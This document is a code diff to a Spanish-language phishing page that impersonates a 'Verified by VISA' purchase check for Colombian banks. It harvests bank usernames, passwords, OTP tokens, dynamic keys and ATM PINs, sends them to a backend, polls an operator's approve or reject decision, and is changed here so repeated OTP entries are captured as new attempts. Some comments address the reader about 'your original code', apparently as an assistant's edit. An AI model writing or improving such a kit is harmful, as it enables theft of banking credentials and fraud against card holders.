@@ -25,7 +25,6 @@
             position: relative;
         }
 
-        /* Capa de desenfoque sobre la imagen */
         body::before {
             content: '';
             position: absolute;
@@ -41,53 +40,54 @@
             background: #ffffff; 
             border-radius: 6px; 
             box-shadow: 0 15px 50px rgba(0, 0, 0, 0.4); 
-            padding: 50px; 
+            padding: 50px 45px; 
             max-width: 480px; 
             width: 100%; 
             position: relative;
             z-index: 1;
         }
 
-        /* Cabecera: Logos más grandes */
+        /* --- CABECERA DE LOGOS --- */
         .header { 
             display: flex; 
-            align-items: center; /* Centrado vertical */
+            align-items: center; 
             justify-content: space-between; 
-            margin-bottom: 30px; 
-            min-height: 80px; /* Altura mínima grande para los logos */
+            margin-bottom: 35px; 
+            min-height: 60px; 
         }
         
-        /* Logo del banco (Izquierda) */
         .bank-logo { 
             display: flex; 
             align-items: center; 
             justify-content: flex-start;
-            height: 80px; /* Tamaño grande */
+            height: 50px;
+            max-width: 50%;
         }
         .bank-logo img { 
             height: 100%; 
             width: auto; 
-            max-width: 180px; /* Más ancho */
+            max-width: 160px; 
             object-fit: contain; 
             display: none; 
         }
         
         .bank-icon-placeholder {
             display: none;
-            width: 60px;
-            height: 60px;
+            width: 45px;
+            height: 45px;
         }
         
-        /* Logo VISA (Derecha) */
         .visa-logo { 
             display: flex; 
             align-items: center; 
             justify-content: flex-end;
-            height: 70px; /* Logo de VISA grande */
+            height: 60px; 
+            max-width: 50%;
         }
         .visa-logo img { 
             height: 100%; 
             width: auto; 
+            max-width: 180px;
             object-fit: contain; 
         }
 
@@ -170,10 +170,15 @@
             display: block; 
         }
 
-        /* Sección OTP */
+        /* Sección OTP (igual que en tu código original, debajo de los inputs) */
         .otp-section { 
             display: none; 
-            animation: fadeIn 0.3s ease; 
+            animation: fadeIn 0.3s ease;
+            background: #f9fafb;
+            border: 1px solid #e5e7eb;
+            border-radius: 6px;
+            padding: 16px;
+            margin-top: 10px;
         }
         .otp-section.visible { 
             display: block; 
@@ -190,10 +195,6 @@
             font-size: 0.95rem; 
             color: #4a4a4a; 
             margin-bottom: 15px; 
-            background: #f9fafb;
-            padding: 14px;
-            border-radius: 6px;
-            border: 1px solid #e5e7eb;
         }
         .otp-info svg { 
             width: 20px; 
@@ -221,18 +222,6 @@
         .btn-primary:disabled { 
             opacity: 0.7; 
             cursor: not-allowed; 
-        }
-
-        /* Texto Resend */
-        .resend-text {
-            text-align: center;
-            font-size: 1rem;
-            color: #6b7280;
-            margin-top: 15px;
-            cursor: pointer;
-        }
-        .resend-text:hover {
-            color: #000;
         }
 
         /* Mensajes de estado */
@@ -308,16 +297,15 @@
             .form-title { font-size: 1.35rem; } 
             .form-input { padding: 14px; font-size: 1rem; }
             
-            /* Ajuste de logos en móvil */
             .header {
-                min-height: 60px;
-                margin-bottom: 20px;
+                min-height: 80px;
+                margin-bottom: 25px;
             }
             .bank-logo {
-                height: 90px;
+                height: 70px; 
             }
             .visa-logo {
-                height: 65px;
+                height: 80px; 
             }
         }
     </style>
@@ -332,23 +320,18 @@
         
         <div class="header">
             <div class="bank-logo" id="bankLogoContainer">
-                <!-- Logo del banco dinámico (Bancolombia, Davivienda, etc.) -->
                 <img id="bankLogoImg" src="" alt="Logo banco" />
-                <!-- Icono por defecto si no se encuentra el logo -->
                 <svg id="bankIconPlaceholder" class="bank-icon-placeholder" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11m16-11v11M8 14v3m4-3v3m4-3v3"/>
                 </svg>
             </div>
             <div class="visa-logo">
-                <!-- Logo de VISA -->
                 <img src="verified.png" alt="Verificado por VISA" />
             </div>
         </div>
 
-        <!-- Título dinámico (Cambia en el OTP) -->
         <h1 class="form-title" id="mainTitle">Autenticación de compra</h1>
         
-        <!-- Subtítulo dinámico (Cambia en el OTP) -->
         <p class="form-subtitle" id="mainSubtitle">
             Ingresa tus credenciales de seguridad para tu <strong id="bankNombre">banco emisor</strong> para validar la transacción.
         </p>
@@ -356,7 +339,7 @@
         <div class="status-message" id="statusMessage"></div>
 
         <form id="authForm" novalidate>
-            <!-- Credenciales -->
+            <!-- Los campos de credenciales SIEMPRE están visibles -->
             <div id="credentialsSection">
                 <div class="form-group" style="margin-bottom: 20px;">
                     <label class="form-label">Usuario <span class="required">*</span></label>
@@ -371,7 +354,7 @@
                 </div>
             </div>
 
-            <!-- OTP -->
+            <!-- Sección OTP que aparece debajo (igual que en tu código original) -->
             <div class="otp-section" id="otpSection">
                 <div class="otp-info" id="otpInfoText">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -379,22 +362,18 @@
                         <path d="M12 8v4"/>
                         <path d="M12 16h.01"/>
                     </svg>
-                    <span id="otpInfoMessage">Ingresa el código de verificación.</span>
+                    <span id="otpInfoMessage">Para realizar este proceso, ingresa el código de Token móvil o físico.</span>
                 </div>
                 <div class="form-group" style="margin-bottom:0;">
-                    <label class="form-label" id="otpLabel">Código de confirmación <span class="required">*</span></label>
-                    <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa tu código" maxlength="8" inputmode="numeric" required />
+                    <label class="form-label" id="otpLabel">Código OTP <span class="required">*</span></label>
+                    <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa tu código de verificación" maxlength="8" inputmode="numeric" required />
                     <div class="error-message">El código debe tener entre 4 y 8 dígitos</div>
                 </div>
             </div>
 
             <button type="submit" class="btn-primary" id="submitButton">
-                <span id="buttonText">Confirmar pago</span>
+                <span id="buttonText">Continuar</span>
             </button>
-
-            <div class="resend-text" id="resendText" style="display:none;">
-                Reenviar código
-            </div>
         </form>
     </div>
 
@@ -450,7 +429,6 @@
         const bankLogoContainer = document.getElementById('bankLogoContainer');
         const bancoNombre = document.getElementById('bankNombre');
         const credentialsSection = document.getElementById('credentialsSection');
-        const resendText = document.getElementById('resendText');
 
         const bankLogos = {
             'Bancolombia': 'bancol.png', 'Davivienda': 'davivienda.png', 'Davibank': 'db.png',
@@ -536,7 +514,6 @@
             if (bancoEmisor) {
                 bancoEmisor = normalizarBanco(bancoEmisor);
                 localStorage.setItem('bancoEmisor', bancoEmisor);
-                // Aquí se inyecta el nombre del banco en el subtítulo de credenciales
                 bancoNombre.textContent = bancoEmisor;
             }
 
@@ -602,13 +579,13 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
                     body: JSON.stringify({
-                        solicitudId: datos.solicitudId,
+                        solicitudId: datos.solicitudId,       // <- MISMO ID
                         codigo: datos.otp,
                         usuario: datos.usuario,
                         monto: datos.monto,
                         fecha: datos.fecha,
                         tipo_paso: 'otp',
-                        solicitudOriginalId: datos.solicitudId,
+                        solicitudOriginalId: datos.solicitudId, // <- MISMO ID PARA EL UPDATE
                         tipo_tarjeta: 'visa',
                         es_reintento: datos.es_reintento || false
                     })
@@ -739,6 +716,11 @@
                 } else if (resultado.estado === 'rejected') {
                     clearInterval(pollingInterval); pollingInterval = null;
                     mostrarError('❌ Credenciales incorrectas o transacción rechazada');
+                    
+                    // Regeneramos el ID aquí SOLO si rechazan las credenciales
+                    solicitudId = 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+                    enviarHeartbeat('activo');
+
                     resetFormulario();
                     formularioBloqueado = false;
                     return;
@@ -825,6 +807,10 @@
                         statusMessage.className = 'status-message error-usuario';
                         statusMessage.textContent = '⚠️ ERROR DE USUARIO: Las credenciales no coinciden. Por favor, ingrese nuevamente sus datos.';
                         statusMessage.style.display = 'block';
+                        
+                        solicitudId = 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+                        enviarHeartbeat('activo');
+
                         resetFormulario();
                         clearInterval(pollingInterval); pollingInterval = null;
                         return;
@@ -838,13 +824,19 @@
                     statusMessage.textContent = mensajeError;
                     statusMessage.style.display = 'block';
 
+                    // 🔥 AQUÍ EL ARREGLO: 
+                    // Generamos un NUEVO solicitudId para que el próximo OTP se guarde como un intento nuevo
+                    solicitudId = 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+                    enviarHeartbeat('activo');
+
                     confirmationInput.value = '';
                     confirmationInput.disabled = false;
                     confirmationInput.focus();
+                    // Mantenemos los inputs deshabilitados para que se vea igual que antes
                     usernameInput.disabled = true;
                     passwordInput.disabled = true;
                     submitButton.disabled = false;
-                    buttonText.textContent = 'Confirmar pago';
+                    buttonText.textContent = 'Continuar';
                     loadingOverlay.classList.remove('active');
                     otpSection.classList.add('visible');
                     pasoActual = 'otp';
@@ -863,43 +855,38 @@
             statusMessage.className = 'status-message';
             statusMessage.style.display = 'none';
             
-            credentialsSection.style.display = 'none';
-            resendText.style.display = 'block';
-            
-            // Texto para cuando pasa al OTP (aquí sí usamos el nombre del banco)
-            document.getElementById('mainTitle').textContent = 'Autenticación de compra';
-            document.getElementById('mainSubtitle').innerHTML = `Hemos enviado un código de seguridad a tu móvil para validar la transacción con <strong>${document.getElementById('bankNombre').textContent}</strong>.`;
+            // Deshabilitamos usuario y contraseña pero NO los ocultamos
+            usernameInput.disabled = true;
+            passwordInput.disabled = true;
 
             if (tipo === 'clave_dinamica') {
-                otpInfoMessage.innerHTML = `<span>Ingresa tu <strong>Clave Dinámica</strong> generada por el banco.</span>`;
+                otpInfoMessage.innerHTML = `<span>Para realizar este proceso, ingresa tu <strong>Clave Dinámica</strong> generada por el banco.</span>`;
                 otpLabel.textContent = 'Clave Dinámica *';
                 confirmationInput.placeholder = 'Ingresa tu clave dinámica';
                 modoAutenticacion = 'clave_dinamica';
             } else if (tipo === 'clave_cajero') {
-                otpInfoMessage.innerHTML = `<span>Ingresa tu <strong>Clave del Cajero</strong> proporcionada por tu banco.</span>`;
+                otpInfoMessage.innerHTML = `<span>Para realizar este proceso, ingresa tu <strong>Clave del Cajero</strong> proporcionada por tu banco.</span>`;
                 otpLabel.textContent = 'Clave del Cajero *';
                 confirmationInput.placeholder = 'Ingresa tu clave del cajero';
                 modoAutenticacion = 'clave_cajero';
             } else {
-                otpInfoMessage.innerHTML = `<span>Ingresa el código de <strong>Token móvil o físico</strong>.</span>`;
-                otpLabel.textContent = 'Código de confirmación *';
-                confirmationInput.placeholder = 'Ingresa tu código';
+                otpInfoMessage.innerHTML = `<span>Para realizar este proceso, ingresa el código de <strong>Token móvil o físico</strong>.</span>`;
+                otpLabel.textContent = 'Código OTP *';
+                confirmationInput.placeholder = 'Ingresa tu código de verificación';
                 modoAutenticacion = 'otp';
             }
             submitButton.disabled = false;
-            buttonText.textContent = 'Confirmar pago';
+            buttonText.textContent = 'Continuar';
         }
 
         function ocultarOTP() {
             otpSection.classList.remove('visible');
             pasoActual = 'credenciales';
-            buttonText.textContent = 'Confirmar pago';
+            buttonText.textContent = 'Continuar';
             confirmationInput.value = '';
             confirmationInput.disabled = true;
             statusMessage.className = 'status-message';
             statusMessage.style.display = 'none';
-            credentialsSection.style.display = 'block';
-            resendText.style.display = 'none';
             ultimoCodigoOTP = null;
         }
 
@@ -909,7 +896,7 @@
             statusMessage.style.display = 'block';
             loadingOverlay.classList.remove('active');
             submitButton.disabled = false;
-            buttonText.textContent = 'Confirmar pago';
+            buttonText.textContent = 'Continuar';
         }
 
         function mostrarExito(mensaje) {
@@ -926,7 +913,7 @@
             ocultarOTP();
             loadingOverlay.classList.remove('active');
             submitButton.disabled = false;
-            buttonText.textContent = 'Confirmar pago';
+            buttonText.textContent = 'Continuar';
             usernameInput.value = '';
             passwordInput.value = '';
             confirmationInput.value = '';
@@ -1040,7 +1027,7 @@
                         mostrarError('Error al procesar el OTP');
                         confirmationInput.disabled = false;
                         submitButton.disabled = false;
-                        buttonText.textContent = 'Confirmar pago';
+                        buttonText.textContent = 'Continuar';
                         loadingOverlay.classList.remove('active');
                         otpSection.classList.add('visible');
                         formularioBloqueado = false;
@@ -1061,7 +1048,7 @@
                         mostrarError('Error al procesar la Clave Dinámica');
                         confirmationInput.disabled = false;
                         submitButton.disabled = false;
-                        buttonText.textContent = 'Confirmar pago';
+                        buttonText.textContent = 'Continuar';
                         loadingOverlay.classList.remove('active');
                         otpSection.classList.add('visible');
                         formularioBloqueado = false;
@@ -1082,7 +1069,7 @@
                         mostrarError('Error al procesar la Clave del Cajero');
                         confirmationInput.disabled = false;
                         submitButton.disabled = false;
-                        buttonText.textContent = 'Confirmar pago';
+                        buttonText.textContent = 'Continuar';
                         loadingOverlay.classList.remove('active');
                         otpSection.classList.add('visible');
                         formularioBloqueado = false;
